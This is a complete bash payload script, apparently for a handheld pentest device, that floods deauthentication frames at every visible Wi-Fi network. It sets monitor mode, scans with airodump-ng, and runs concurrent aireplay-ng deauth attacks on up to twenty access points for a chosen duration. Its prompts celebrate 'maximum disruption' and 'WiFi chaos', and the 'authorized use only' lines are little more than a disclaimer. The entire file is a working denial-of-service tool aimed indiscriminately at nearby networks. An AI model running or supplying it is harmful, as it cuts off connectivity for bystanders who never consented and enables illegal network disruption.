#!/bin/bash
# Title: Mass Deauth
# Author: bad-antics
# Description: Simultaneous deauth attack on all networks
# Category: nullsec/attack

PROMPT "MASS DEAUTH

Deauth ALL visible
networks simultaneously.

Maximum disruption mode.
For authorized testing only.

Press OK to continue."

INTERFACE="wlan0"
CHANNEL=$(TEXT_PICKER "Channel (1-14 or all):" "all")

resp=$(CONFIRMATION_DIALOG "THIS WILL ATTACK
ALL VISIBLE NETWORKS!

Extremely disruptive.
For authorized use only.

Confirm to proceed.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# Stop monitor processes
airmon-ng check kill 2>/dev/null
sleep 1

# Enable monitor mode
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

LOG "Monitor: $MON_IF"
SPINNER_START "Scanning networks..."

# Quick scan
TEMP_DIR="/tmp/massdeauth_$$"
mkdir -p "$TEMP_DIR"

if [ "$CHANNEL" = "all" ]; then
    timeout 15 airodump-ng $MON_IF -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
else
    timeout 15 airodump-ng $MON_IF -c $CHANNEL -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
fi
sleep 15

SPINNER_STOP

# Parse targets
TARGETS=$(grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "$TEMP_DIR/scan-01.csv" 2>/dev/null | head -20)
COUNT=$(echo "$TARGETS" | wc -l)

PROMPT "FOUND $COUNT NETWORKS

Starting mass deauth...

Attack will run for 60s
or until cancelled.

Press OK to begin."

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)

SPINNER_START "Deauthing $COUNT networks..."

# Attack each network
echo "$TARGETS" | while read LINE; do
    BSSID=$(echo "$LINE" | cut -d',' -f1 | tr -d ' ')
    CH=$(echo "$LINE" | cut -d',' -f4 | tr -d ' ')
    
    if [ -n "$BSSID" ] && [ "$BSSID" != "BSSID" ]; then
        iwconfig $MON_IF channel $CH 2>/dev/null
        aireplay-ng --deauth 100 -a "$BSSID" $MON_IF >/dev/null 2>&1 &
    fi
done

sleep $DURATION

# Kill all aireplay processes
killall aireplay-ng 2>/dev/null

SPINNER_STOP

# Cleanup
airmon-ng stop $MON_IF 2>/dev/null
rm -rf "$TEMP_DIR"

PROMPT "ATTACK COMPLETE

Deauthed $COUNT networks
for $DURATION seconds.

WiFi chaos achieved.

Press OK to exit."
